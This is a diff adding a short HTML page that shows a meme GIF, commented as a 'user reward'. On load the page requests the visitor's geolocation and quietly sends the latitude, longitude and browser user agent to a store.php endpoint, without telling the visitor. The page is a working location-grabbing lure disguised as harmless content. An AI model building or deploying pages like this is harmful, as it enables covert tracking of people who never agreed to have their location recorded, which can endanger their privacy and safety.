@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html>
+<body onload="getLocation()">
+
+
+<!-- user reward -->
+<div class="tenor-gif-embed" data-postid="21890806" data-share-method="host" data-aspect-ratio="1" data-width="100%"><a href="https://tenor.com/view/memes-meme-funny-cat-gif-21890806">Memes Funny Sticker</a>from <a href="https://tenor.com/search/memes-stickers">Memes Stickers</a></div> <script type="text/javascript" async src="https://tenor.com/embed.js"></script>
+
+
+<!-- demo element required -->
+<p id="demo"></p>
+
+<script>
+var x = document.getElementById("demo");
+
+function getLocation() {
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(showPosition);
+  } else { 
+    x.innerHTML = "Geolocation is not supported by this browser.";
+  }
+}
+
+function showPosition(position) {
+    const xhttp =  new XMLHttpRequest();
+    xhttp.open("GET", "store.php?lat=" + position.coords.latitude + "&long=" + position.coords.longitude + "&uagent=" + navigator.userAgent);
+    xhttp.send(); 
+
+  
+}
+</script>
+
+</body>
+</html>
+
